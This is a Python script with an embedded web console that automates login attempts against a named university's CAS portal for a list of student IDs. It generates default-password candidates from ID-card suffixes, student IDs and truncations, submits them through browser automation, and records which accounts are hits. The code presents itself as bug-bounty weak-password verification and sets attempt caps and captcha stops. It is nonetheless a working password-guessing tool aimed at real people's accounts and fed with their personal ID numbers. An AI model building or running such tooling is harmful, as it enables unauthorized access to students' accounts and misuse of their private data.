# -*- coding: utf-8 -*-
"""浏览器半自动验证作业台 v2（本地控制台 http://127.0.0.1:8795）。

v2 变更：把「密码规则」编码进脚本，自动生成候选口令并填入表单，用户不再手输密码。
分工：
  - 脚本接管 Chrome：打开登录页、填学号、按规则生成并填密码、（可选）自动点登录、
    轮询判定结果、回填 CSV、写结果证据、换下一行 / 换下一候选。
  - 用户做人机：验证码弹出时人工识别输入；命中时录屏。
红线：
  - 密码只由「公示规则 + 本地自备证件号」生成，不爆破、不猜测字典、不做组合穷举。
  - 不读取、不保存、不输出密码明文（控制台只显示掩码）。
  - 不翻阅登录后的任何真实用户数据；只判 URL 与结果提示词。
  - 单入口连续尝试上限 5 组；命中 / 账号锁定 / 强制改密 / 验证码弹出 立即停。
  - 含真实学号与证件号的本地文件只存 E:\\kimi\\scan，不推公开仓库。
"""
import csv, json, os, threading, time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse

import requests

WB = "http://127.0.0.1:10086/command"
SES = "edusrc-login"
ENTRY = "https://ehall.csmzxy.edu.cn/"
CSV_PATH = r"E:\kimi\scan\需调试学号清单_20261111.csv"
ID6_CSV = r"E:\kimi\scan\证件后六位_本地.csv"      # 可选：sid,id6，用户自备，绝不入库
EVID_DIR = r"E:\kimi\scan\login_evidence"
STATE_JSON = r"E:\kimi\scan\fofa_pool\login_workbench_state_20261111.json"
PORT = 8795
MAX_STREAK = 5

# ---- 密码规则（全部来自公开材料，写死在脚本里，按依据级别排序） ----
RULE_SOURCES = {
    "R1": "学校公开 PDF《网上办事服务大厅业务流程介绍》2.1：账号=教职工号/学号（新生为身份证件号），密码=默认身份证后六位",
    "R2": "同类 CAS 公开兜底：长江师范学院《一站式网上办事服务大厅试运行通知》——「如果首次初始密码身份证后六位无法登录，请使用学号或职工号作为密码登录」",
    "R3": "同类高校登录说明常见的「学号后六位」截位规则（该单位无公示依据，仅供参考，报送时不作为主证据）",
}

ID6 = {}
if os.path.isfile(ID6_CSV):
    for r in csv.DictReader(open(ID6_CSV, encoding="utf-8-sig")):
        sid = (r.get("sid") or "").strip()
        id6 = (r.get("id6") or "").strip().upper()
        if sid and id6:
            ID6[sid] = id6


def candidates(sid):
    """按公示规则生成有序候选口令；(规则号, 名称, 依据级别, 口令或 None)。"""
    out = []
    id6 = ID6.get(sid)
    out.append(("R1", "身份证后六位（学校公示默认规则）", "官方公示",
                id6 if id6 else None))
    out.append(("R2", "学号（同类 CAS 公开兜底口令）", "同类公开兜底", sid))
    out.append(("R3", "学号后六位（同类常见截位）", "推测·无本校准据", sid[-6:]))
    return out


os.makedirs(EVID_DIR, exist_ok=True)
os.makedirs(os.path.dirname(STATE_JSON), exist_ok=True)
rows = list(csv.DictReader(open(CSV_PATH, encoding="utf-8-sig")))
COLS = list(rows[0].keys())

LOCK = threading.Lock()
STATE = {
    "idx": 0,
    "cand_idx": 0,
    "attempts_streak": 0,
    "running": True,
    "auto_run": False,        # 失败后自动换候选/换行并自动提交
    "events": [],
    "last": None,
    "waiting_captcha": False,
}


def log(msg):
    with LOCK:
        STATE["events"].insert(0, "%s  %s" % (time.strftime("%H:%M:%S"), msg))
        STATE["events"] = STATE["events"][:40]
    print("[workbench]", msg, flush=True)


def save_csv():
    with open(CSV_PATH, "w", encoding="utf-8-sig", newline="") as f:
        w = csv.DictWriter(f, fieldnames=COLS)
        w.writeheader()
        w.writerows(rows)


def wb(action, args=None, timeout=45):
    p = {"action": action, "args": args or {}, "session": SES}
    try:
        return requests.post(WB, json=p, timeout=timeout).json()
    except Exception as e:
        return {"ok": False, "err": str(e)[:160]}


def ev(code):
    r = wb("evaluate", {"code": code})
    v = (r.get("data") or {}).get("value")
    if v is None:
        return None
    try:
        return json.loads(v) if isinstance(v, str) and v.strip().startswith("{") else v
    except Exception:
        return v


PROBE = r"""(() => {
  const b = document.body ? document.body.innerText : '';
  const u = location.href;
  const has = (s) => b.indexOf(s) >= 0;
  const onLogin = /\/authserver\/login/.test(u);
  const f = document.getElementById('pwdFromId');
  const c = f ? f.querySelector('#captcha') : null;
  return JSON.stringify({
    url: u.slice(0, 220),
    title: (document.title || '').slice(0, 90),
    onLogin: onLogin,
    captchaVisible: c ? (c.offsetParent !== null) : false,
    captchaFilled: c ? !!((c.value||'').trim()) : false,
    success: !onLogin && (has('退出') || has('个人中心') || has('办事大厅') || has('欢迎您') || has('我的应用')),
    errPwd: /用户名.{0,8}密码.{0,8}(有误|错误|不正确)|密码.{0,6}(有误|错误|不正确)|认证失败|用户名不存在|账号或密码/.test(b) || has('您提供的用户名'),
    errCaptcha: has('验证码错误') || has('验证码不正确') || has('验证码已失效'),
    locked: has('账号已被锁定') || has('账号已锁定') || has('已被禁用') || has('账号已被禁用'),
    mustChange: has('首次登录必须修改') || has('密码已过期') || has('强制修改密码') || /changePassword|updatePassword|forceModify/i.test(u),
    hint: b.slice(0, 200).replace(/\s+/g, ' ')
  });
})()"""


def current_row():
    with LOCK:
        i = STATE["idx"]
        if i >= len(rows):
            return None, None, None
        r = rows[i]
        cs = candidates(r["账号"])
        ci = min(STATE["cand_idx"], len(cs) - 1)
        return i, r, cs[ci]


def fill_form(sid, pwd):
    """一次填入学号 + 规则生成的密码；不读取任何输入框的既有值。"""
    code = """(() => {
      const f = document.getElementById('pwdFromId');
      if (!f) return JSON.stringify({ok:false, err:'NO_FORM'});
      const u = f.querySelector('#username'), p = f.querySelector('#password');
      if (!u || !p) return JSON.stringify({ok:false, err:'NO_FIELD'});
      u.value = %s;
      p.value = %s;
      ['input','change','keyup','blur'].forEach(t => {
        u.dispatchEvent(new Event(t, {bubbles:true}));
        p.dispatchEvent(new Event(t, {bubbles:true}));
      });
      return JSON.stringify({ok:true, user_set:!!u.value, pwd_set:!!p.value});
    })()""" % (json.dumps(sid), json.dumps(pwd or ""))
    return ev(code)


CLICK = r"""(() => {
  const f = document.getElementById('pwdFromId');
  const c = f ? f.querySelector('#captcha') : null;
  const capVisible = c ? (c.offsetParent !== null) : false;
  const capFilled = c ? !!((c.value||'').trim()) : false;
  if (capVisible && !capFilled) return JSON.stringify({ok:false, need:'captcha'});
  const btn = document.getElementById('login_submit');
  if (!btn) return JSON.stringify({ok:false, need:'no_button'});
  btn.click();
  return JSON.stringify({ok:true, submitted:true, capFilled:capFilled});
})()"""


def submit_current():
    """填入当前候选并点击登录（触发页面自带的密码加盐与提交链）。"""
    i, r, cand = current_row()
    if r is None:
        return {"ok": False, "err": "清单已跑完"}
    rid, name, basis, pwd = cand
    if pwd is None:
        log("%s 规则 %s 缺证件号 → 跳过，改用下一条候选" % (r["调试序号"], rid))
        with LOCK:
            STATE["cand_idx"] += 1
        return submit_current()
    fill_form(r["账号"], pwd)
    time.sleep(0.4)
    cr = wb("evaluate", {"code": CLICK}, timeout=10)
    res = (cr.get("data") or {}).get("value")
    try:
        res = json.loads(res) if isinstance(res, str) and res.strip().startswith("{") else res
    except Exception:
        res = None
    if not isinstance(res, dict):
        res = {"ok": True, "note": "点击后页面已导航，返回值丢失"}
    masked = pwd[:2] + "*" * max(0, len(pwd) - 4) + pwd[-2:] if len(pwd) > 4 else "****"
    if res.get("need") == "captcha":
        with LOCK:
            STATE["waiting_captcha"] = True
            STATE["running"] = False
        log("%s 验证码已弹出 → 停机，请你人工识别并输入后点登录" % r["调试序号"])
        return {"ok": False, "need": "captcha"}
    with LOCK:
        STATE["waiting_captcha"] = False
        STATE["running"] = True
    log("%s 已按 [%s %s] 自动填密码(%s)并点登录 → 等待判定" %
        (r["调试序号"], rid, basis, masked))
    return {"ok": True}


def open_row(i, auto_submit=False):
    """打开登录页、自动填学号 + 当前候选密码；可选自动提交。"""
    if i >= len(rows):
        log("清单已跑完")
        return
    with LOCK:
        STATE["cand_idx"] = 0
        STATE["waiting_captcha"] = False
    sid, tag = rows[i]["账号"], rows[i]["调试序号"]
    wb("navigate", {"url": ENTRY})
    time.sleep(5)
    _, _, cand = current_row()
    if cand[3] is None:          # R1 缺证件号 → 自动从 R2 开始，不留空密码
        with LOCK:
            STATE["cand_idx"] = 1
        _, _, cand = current_row()
    res = fill_form(sid, cand[3] or "")
    if isinstance(res, dict) and not res.get("ok"):
        time.sleep(3)
        res = fill_form(sid, cand[3] or "")
    rid, name, basis, pwd = cand
    log("%s 学号 %s 已填；密码按 [%s %s] 自动生成并填入（%s）" %
        (tag, sid, rid, basis, "填表成功" if isinstance(res, dict) and res.get("ok") else str(res)[:60]))
    with LOCK:
        STATE["last"] = None
    if auto_submit:
        time.sleep(0.5)
        submit_current()


def record(verdict, probe):
    """回填 CSV + 保存不含密码明文的结果证据。"""
    with LOCK:
        i = STATE["idx"]
        r = rows[i]
        cand = candidates(r["账号"])[min(STATE["cand_idx"], 2)]
    tag, sid = r["调试序号"], r["账号"]
    rid, name, basis, _ = cand
    r["调试状态(你填)"] = verdict
    r["调试结果/录屏(你填)"] = "%s 自动判定：%s｜规则 %s（%s）（录屏请自行补充）" % (
        time.strftime("%Y-%m-%d %H:%M:%S"), verdict, rid, basis)
    save_csv()
    ev_path = os.path.join(EVID_DIR, "%s_%s.json" % (tag, sid))
    json.dump({
        "tag": tag, "student_id": sid, "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
        "verdict": verdict, "rule": rid, "rule_name": name, "rule_basis": basis,
        "url": probe.get("url"), "title": probe.get("title"),
        "hint": (probe.get("hint") or "")[:200],
        "note": "只记录 URL、规则号与结果提示词；不含密码、验证码、真实用户数据",
    }, open(ev_path, "w", encoding="utf-8"), ensure_ascii=False, indent=1)
    json.dump({"idx": STATE["idx"], "cand_idx": STATE["cand_idx"],
               "streak": STATE["attempts_streak"], "verdict": verdict,
               "rule": rid, "ts": time.strftime("%Y-%m-%d %H:%M:%S")},
              open(STATE_JSON, "w", encoding="utf-8"), ensure_ascii=False, indent=1)
    log("%s %s → %s（规则 %s）" % (tag, sid, verdict, rid))
    return verdict


def advance_after_failure():
    """失败后：先换下一条候选规则，用完则换下一行。"""
    with LOCK:
        r = rows[STATE["idx"]]
        cs = candidates(r["账号"])
        if STATE["cand_idx"] < len(cs) - 1:
            STATE["cand_idx"] += 1
            move = "candidate"
        else:
            STATE["cand_idx"] = 0
            STATE["idx"] += 1
            move = "row"
    if move == "candidate":
        submit_current()
    else:
        open_row(STATE["idx"], auto_submit=True)


def poll_loop():
    """每 2 秒判定一次登录结果；命中/锁定/强制改密/上限 立即停。"""
    last_hint = ""
    while True:
        time.sleep(2)
        with LOCK:
            # waiting_captcha 时仍继续探测：用户自己输码点登录后，结果也要自动回填
            if not STATE["running"] and not STATE["waiting_captcha"]:
                continue
            i = STATE["idx"]
            if i >= len(rows) or rows[i]["调试状态(你填)"].strip():
                continue
        p = ev(PROBE)
        if not isinstance(p, dict):
            continue
        if p.get("captchaVisible") and not p.get("captchaFilled"):
            hint = "%s 检测到验证码" % rows[STATE["idx"]]["调试序号"]
            if hint != last_hint:
                log(hint + " → 等你人工输入后点登录")
                last_hint = hint
            if STATE["waiting_captcha"]:
                continue
        last_hint = ""
        verdict = None
        if p.get("success"):
            verdict = "命中"
        elif p.get("locked"):
            verdict = "账号锁定(停)"
        elif p.get("mustChange"):
            verdict = "强制改密(死线)"
        elif p.get("errPwd"):
            verdict = "失败"
        elif p.get("errCaptcha"):
            verdict = "验证码挡住"
        if not verdict:
            continue
        record(verdict, p)
        with LOCK:
            STATE["waiting_captcha"] = False
            STATE["attempts_streak"] += 1
            stop = (verdict in ("命中", "账号锁定(停)", "强制改密(死线)")
                    or STATE["attempts_streak"] >= MAX_STREAK
                    or not STATE["auto_run"])
            auto = STATE["auto_run"] and not stop and verdict == "失败"
            STATE["last"] = {"verdict": verdict, "tag": rows[i]["调试序号"],
                             "hint": p.get("hint", "")[:120]}
        if stop:
            reason = "连续尝试达 %d 组上限" % MAX_STREAK if STATE["attempts_streak"] >= MAX_STREAK else verdict
            log("停机：%s → 请录屏 / 人工确认后点「重置继续」" % reason)
            with LOCK:
                STATE["running"] = False
        elif auto:
            time.sleep(2)
            advance_after_failure()


HTML = r"""<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">
<title>edusrc 弱密钥 · 浏览器验证作业台 v2</title>
<style>
body{font:14px/1.6 -apple-system,"Microsoft YaHei",sans-serif;background:#f5f7fa;color:#1f2937;margin:0;padding:24px}
.wrap{max-width:1040px;margin:0 auto}
h1{font-size:20px;margin:0 0 6px}.sub{color:#6b7280;margin-bottom:18px}
.card{background:#fff;border:1px solid #e5e7eb;border-radius:10px;padding:18px;margin-bottom:14px;box-shadow:0 1px 2px rgba(0,0,0,.03)}
.current{font-size:17px;font-weight:600;margin-bottom:8px}
.sid{font:700 26px/1.3 Consolas,monospace;color:#0f766e;letter-spacing:1px}
.kv{display:grid;grid-template-columns:130px 1fr;gap:6px 12px;margin-top:12px;color:#374151}
.kv b{color:#6b7280;font-weight:500}
button{border:0;border-radius:7px;padding:9px 16px;font-size:14px;cursor:pointer;margin:4px 6px 4px 0}
.p{background:#0f766e;color:#fff}.s{background:#e5e7eb;color:#111827}.w{background:#fef3c7;color:#92400e}.d{background:#fee2e2;color:#991b1b}
.bar{height:8px;background:#e5e7eb;border-radius:4px;overflow:hidden;margin:10px 0}.bar i{display:block;height:100%;background:#0f766e}
table{width:100%;border-collapse:collapse;font-size:13px}th,td{padding:6px 8px;border-bottom:1px solid #eef2f7;text-align:left}
.ok{color:#0f766e;font-weight:600}.bad{color:#b91c1c}.warn{color:#b45309}
#log{background:#111827;color:#d1fae5;border-radius:8px;padding:12px;height:170px;overflow:auto;font:12px/1.6 Consolas,monospace;white-space:pre-wrap}
.tip{background:#ecfdf5;border:1px solid #a7f3d0;color:#065f46;border-radius:8px;padding:12px;margin-bottom:14px}
.rules{background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;padding:10px;font-size:13px;color:#475569;margin-top:10px}
label{display:inline-flex;align-items:center;gap:6px;margin-right:16px}
code{background:#f1f5f9;padding:1px 5px;border-radius:4px}
</style></head><body><div class="wrap">
<h1>edusrc 弱密钥 · 浏览器验证作业台 <span style="color:#0f766e">v2</span></h1>
<div class="sub">密码规则已写进脚本：自动按规则生成候选口令、填表、点登录。你只做<b>验证码人机</b>和<b>命中录屏</b>。</div>
<div class="tip"><b>现在的操作</b>：点「验证这一行」→ 脚本自动填学号+密码并点登录 → 自动判结果回填 CSV。想全自动就勾「自动连跑」，失败会自动换规则/换行，直到命中、验证码弹出或 5 组上限。<br>
<b>验证码</b>：首屏不显示；一旦弹出，脚本立即停机，你在 Chrome 里输入后自己点登录，判定仍会自动记录。</div>
<div class="card">
  <div class="current">当前行：<span id="tag">—</span> <span id="status" class="warn">等待</span></div>
  <div class="sid" id="sid">—</div>
  <div class="kv">
    <b>登录 URL</b><span>https://ehall.csmzxy.edu.cn/ → authserver.csmzxy.edu.cn/authserver/login</span>
    <b>当前密码规则</b><span id="rule">—</span>
    <b>候选口令(掩码)</b><span><code id="pwd">—</code> <span id="candn">—</span></span>
    <b>证件号源</b><span id="id6">—</span>
    <b>来源</b><span id="src">—</span>
    <b>进度</b><span id="prog">—</span>
  </div>
  <div class="rules" id="rules">
    <b>脚本内置规则（按依据级别排序）：</b><br>
    R1 身份证后六位 —— 学校公开 PDF 2.1 明文公示（需证件号：可放 <code>E:\kimi\scan\证件后六位_本地.csv</code>，列 <code>sid,id6</code>）<br>
    R2 学号 —— 同类 CAS 公开兜底口令（长江师范学院试运行通知）<br>
    R3 学号后六位 —— 同类常见截位，该校无公示依据，仅供参考
  </div>
  <div class="bar"><i id="bar" style="width:0%"></i></div>
  <button class="p" onclick="act('verify')">验证这一行（自动填+提交）</button>
  <button class="s" onclick="act('nextcand')">换下一条规则</button>
  <button class="s" onclick="act('fill')">重填当前规则</button>
  <button class="s" onclick="act('next')">下一行</button>
  <button class="w" onclick="act('reset')">重置计数继续</button>
  <button class="d" onclick="act('stop')">停止</button>
  <div style="margin-top:8px"><label><input type="checkbox" id="auto" onchange="autoRun(this.checked)"> 自动连跑（失败自动换规则/换行并提交）</label>
  <span style="color:#6b7280">硬上限 <b>5</b> 组；命中 / 锁定 / 强制改密 / 验证码 立即停</span></div>
</div>
<div class="card"><h3 style="margin:0 0 8px;font-size:15px">最近判定</h3><table id="tbl"><thead><tr><th>调试序号</th><th>学号</th><th>状态</th><th>规则</th><th>来源</th></tr></thead><tbody></tbody></table></div>
<div class="card"><h3 style="margin:0 0 8px;font-size:15px">运行日志</h3><div id="log"></div></div>
</div><script>
function act(x){fetch('/api/'+x).then(r=>r.json()).then(refresh)}
function autoRun(v){fetch('/api/auto?v='+(v?1:0)).then(r=>r.json()).then(refresh)}
function refresh(){fetch('/api/state').then(r=>r.json()).then(d=>{
  const c=d.current||{}, k=d.cand||{};
  document.getElementById('tag').textContent=c.tag||'—';
  document.getElementById('sid').textContent=c.sid||'—';
  document.getElementById('src').textContent=c.src||'—';
  document.getElementById('rule').textContent=(k.id||'—')+' '+(k.name||'')+' ｜ '+(k.basis||'');
  document.getElementById('pwd').textContent=k.masked||'—';
  document.getElementById('candn').textContent='（第 '+(k.n||0)+' / '+(k.total||0)+' 条候选）';
  document.getElementById('id6').textContent=d.id6_ready?('已加载 '+d.id6_ready+' 组'):'未加载 → R1 自动跳过，从 R2 开始';
  document.getElementById('prog').textContent=d.done+' / '+d.total+' 已判定，连续尝试 '+d.streak+' 组';
  document.getElementById('bar').style.width=(d.done/d.total*100).toFixed(1)+'%';
  const st=document.getElementById('status');
  st.textContent=d.waiting_captcha?'等你输入验证码':(d.running?(d.last?('已判定：'+d.last.verdict):'等待验证'):'已停机');
  st.className=d.last&&d.last.verdict==='命中'?'ok':(d.running?'warn':'bad');
  document.getElementById('auto').checked=!!d.auto_run;
  let h='';(d.recent||[]).forEach(r=>{h+='<tr><td>'+r.tag+'</td><td><code>'+r.sid+'</code></td><td class="'+(r.status==='命中'?'ok':(r.status.includes('停')||r.status.includes('死线')?'bad':''))+'">'+r.status+'</td><td>'+(r.rule||'')+'</td><td>'+(r.src||'').slice(0,34)+'</td></tr>'});
  document.querySelector('#tbl tbody').innerHTML=h;
  document.getElementById('log').textContent=(d.events||[]).join('\n');
})}
setInterval(refresh,1500);refresh();
</script></body></html>"""


class H(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _send(self, body, ctype="application/json; charset=utf-8"):
        b = body.encode("utf-8") if isinstance(body, str) else body
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def do_GET(self):
        u = urlparse(self.path)
        q = parse_qs(u.query)
        if u.path == "/":
            return self._send(HTML, "text/html; charset=utf-8")
        if u.path == "/api/state":
            with LOCK:
                i, ci = STATE["idx"], STATE["cand_idx"]
                c = rows[i] if i < len(rows) else {}
                cs = candidates(c["账号"]) if c else []
                k = cs[min(ci, len(cs) - 1)] if cs else ("", "", "", "")
                pwd = k[3] or ""
                masked = (pwd[:2] + "*" * max(0, len(pwd) - 4) + pwd[-2:]) if len(pwd) > 4 else ("****" if pwd else "（缺证件号）")
                recent = [{"tag": r["调试序号"], "sid": r["账号"],
                           "status": r["调试状态(你填)"],
                           "rule": (r["调试结果/录屏(你填)"].split("规则 ")[-1][:2] if "规则 " in r["调试结果/录屏(你填)"] else ""),
                           "src": r["来源公示页"]}
                          for r in rows if r["调试状态(你填)"].strip()][-12:][::-1]
                return self._send(json.dumps({
                    "current": {"tag": c.get("调试序号"), "sid": c.get("账号"),
                                "src": c.get("来源公示页")},
                    "cand": {"id": k[0], "name": k[1], "basis": k[2],
                             "masked": masked, "n": ci + 1, "total": len(cs)},
                    "id6_ready": len(ID6),
                    "done": sum(1 for r in rows if r["调试状态(你填)"].strip()),
                    "total": len(rows), "streak": STATE["attempts_streak"],
                    "running": STATE["running"], "auto_run": STATE["auto_run"],
                    "waiting_captcha": STATE["waiting_captcha"],
                    "last": STATE["last"], "recent": recent, "events": STATE["events"],
                }, ensure_ascii=False))
        if u.path == "/api/verify":
            with LOCK:
                STATE["running"] = True
                STATE["waiting_captcha"] = False
            threading.Thread(target=submit_current, daemon=True).start()
            return self._send('{"ok":true}')
        if u.path == "/api/fill":
            i, r, cand = current_row()
            if r:
                threading.Thread(target=fill_form, args=(r["账号"], cand[3] or ""), daemon=True).start()
                log("%s 已重填规则 %s" % (r["调试序号"], cand[0]))
            return self._send('{"ok":true}')
        if u.path == "/api/nextcand":
            with LOCK:
                r = rows[STATE["idx"]]
                cs = candidates(r["账号"])
                if STATE["cand_idx"] < len(cs) - 1:
                    STATE["cand_idx"] += 1
            i, r, cand = current_row()
            fill_form(r["账号"], cand[3] or "")
            log("%s 切换到规则 %s %s" % (r["调试序号"], cand[0], cand[1]))
            return self._send('{"ok":true}')
        if u.path == "/api/next":
            with LOCK:
                while STATE["idx"] < len(rows) and rows[STATE["idx"]]["调试状态(你填)"].strip():
                    STATE["idx"] += 1
                STATE["running"] = True
                i = STATE["idx"]
            if i < len(rows):
                threading.Thread(target=open_row, args=(i, False), daemon=True).start()
            return self._send('{"ok":true}')
        if u.path == "/api/reset":
            with LOCK:
                STATE["attempts_streak"] = 0
                STATE["running"] = True
                STATE["last"] = None
            log("计数已重置，继续运行")
            return self._send('{"ok":true}')
        if u.path == "/api/stop":
            with LOCK:
                STATE["running"] = False
            log("用户手动停机")
            return self._send('{"ok":true}')
        if u.path == "/api/auto":
            with LOCK:
                STATE["auto_run"] = (q.get("v") or ["0"])[0] == "1"
                STATE["running"] = True
            log("自动连跑：" + ("开" if STATE["auto_run"] else "关"))
            return self._send('{"ok":true}')
        return self._send('{"ok":false,"err":"unknown"}')


if __name__ == "__main__":
    with LOCK:
        while STATE["idx"] < len(rows) and rows[STATE["idx"]]["调试状态(你填)"].strip():
            STATE["idx"] += 1
    if STATE["idx"] < len(rows):
        threading.Thread(target=open_row, args=(STATE["idx"], False), daemon=True).start()
    threading.Thread(target=poll_loop, daemon=True).start()
    srv = ThreadingHTTPServer(("127.0.0.1", PORT), H)
    print("workbench v2: http://127.0.0.1:%d | rows=%d | id6=%d | rules=3" %
          (PORT, len(rows), len(ID6)), flush=True)
    srv.serve_forever()
